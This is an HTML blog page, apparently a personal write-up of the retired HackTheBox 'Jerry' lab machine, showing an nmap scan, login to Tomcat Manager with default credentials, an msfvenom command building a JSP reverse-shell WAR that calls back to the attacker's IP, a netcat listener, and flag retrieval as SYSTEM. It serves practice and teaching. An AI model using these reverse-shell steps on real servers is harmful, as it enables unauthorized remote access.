@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>crazyeights225</title>
+   
+    <link rel="stylesheet" href="../assets/bulma.min.css">
+    <link rel="stylesheet" href="../static/default.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.4.0/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script>
+    <style>
+      span{margin: 0; line-height: 125%; white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;}pre{padding:0.5rem 0.5rem!important;}
+    </style>
+  </head>
+  <body>
+    <div id="app" class="mt-2">
+        <nav class="navbar container" role="navigation" aria-label="main navigation">
+            <div class="navbar-brand">
+              <a class="navbar-item" href="/">
+                <img src="../assets/logo.png">
+              </a>
+              <a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false" data-target="navbarBasicExample">
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+              </a>
+            </div>
+            <div id="navbar" class="navbar-menu">
+              <div class="navbar-start">
+                    <a href="../index.html" class="navbar-item">Posts</a>
+                    <a href="../projects.html" class="navbar-item">Projects</a>
+              </div>
+            </div>
+          </nav>
+    </div>
+    <div class="hero-body mt-2" style="background-color: #285aff;">
+        <div class="container has-text-centered">
+            <h1 class="title" style="color: #f1f1f1;">
+                HacktheBox: Jerry
+            </h1>
+            <h2 class="subtitle" style="color: #f1f1f1;">
+                Jan 3, 2021
+            </h2>
+        </div>
+    </div>
+</section>
+<section class="container mt-2">
+<div class="content column is-10">
+    <nav class="breadcrumb mb-5" aria-label="breadcrumbs">
+        <ul>
+          <li><a href="../index.html">Posts</a></li>
+          <li><a href="../sec.html">CTFs and Vulnerable VMs</a></li>
+          <li class="is-active"><a href="#" aria-current="page">Jerry</a></li>
+        </ul>
+      </nav>
+<h4>Practing some retired machines</h4>
+<h5>IP: 10.10.10.95</h5>
+<h3>Scanning:</h3>
+<ul>
+<li>Finding running services:</li>
+</ul>
+<pre><code><span>crazyeights@es-base:~$ sudo nmap -sS 10.10.10.95
+[sudo] password for crazyeights: 
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-03 11:51 EST
+Nmap scan report for 10.10.10.95
+Host is up (0.033s latency).
+Not shown: 999 filtered ports
+PORT     STATE SERVICE
+8080/tcp open  http-proxy
+</span></code></pre>
+<h3>Web:</h3>
+<ul>
+<li>
+<p>Tomcat 7.0.88 is running</p>
+</li>
+<li>
+Click 'Manager App' to login as manager
+<img src="images/23/s1.png">
+</li>
+<li>
+<p>After incorrectly guessing the login, we see this page:</p>
+<img src="images/23/s2.png">
+</li>
+<li>
+<p>Trying the credentials on the page (default credentials), we get:</p>
+<img src="images/23/s3.png">
+</li>
+<li>
+<p>It allows for the manager to upload WARs, so we can upload a WAR containing a reverse shell</p>
+</li>
+<li>
+<p>Using msfvenom to create a WAR</p>
+</li>
+<li>
+<p>Msfvenom Command Format:</p>
+</li>
+</ul>
+<pre><code><span>msfvenom -p java/jsp_shell_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f war &gt; example.war
+</span></code></pre>
+<ul>
+<li>Creating the WAR:</li>
+</ul>
+<pre><code><span>crazyeights@es-base:~$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.11 LPORT=1234 -f war &gt; bad.war
+</span></code></pre>
+<ul>
+<li>Start the listener:</li>
+</ul>
+<pre><code><span>crazyeights@es-base:~$ nc -lvp 1234
+listening on [any] 1234 ...
+
+</span></code></pre>
+<ul>
+<li>Upload the file:
+<img src="images/23/s4.png"></li>
+<li>We can now see the WAR in the list of deployed applications:
+<img src="images/23/s5.png"></li>
+<li>
+    Click on it in the table to visit it's location, and connect to the listener
+    <img src="images/23/s6.png">
+</li>
+</ul>
+<h3>Root:</h3>
+<ul>
+<li>Since we have system privileges all we need to do is get the flags:</li>
+<li>Go to the directory <code>C:\Users\Administrator\Desktop\flags</code></li>
+</ul>
+<pre><code><span>Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\apache-tomcat-7.0.88&gt;whoami
+whoami
+nt authority\system
+
+C:\Users\Administrator\Desktop\flags&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is FC2B-E489
+
+ Directory of C:\Users\Administrator\Desktop\flags
+
+06/19/2018  06:09 AM    &lt;DIR&gt;          .
+06/19/2018  06:09 AM    &lt;DIR&gt;          ..
+06/19/2018  06:11 AM                88 2 for the price of 1.txt
+               1 File(s)             88 bytes
+               2 Dir(s)  27,601,014,784 bytes free
+
+C:\Users\Administrator\Desktop\flags&gt;type &quot;2 for the price of 1.txt&quot;
+type &quot;2 for the price of 1.txt&quot;
+user.txt
+7004d_i_dont_want_to_get_in_trouble
+
+root.txt
+04a8b_i_dont_want_to_get_in_trouble
+</span></code></pre>
+<p>FIN.</p>
+</div>
+</section>
+<footer class="footer">
+    <div class="container">
+        <div class="columns">
+        </div>
+    </div>
+</footer>
+</body>
+</html>
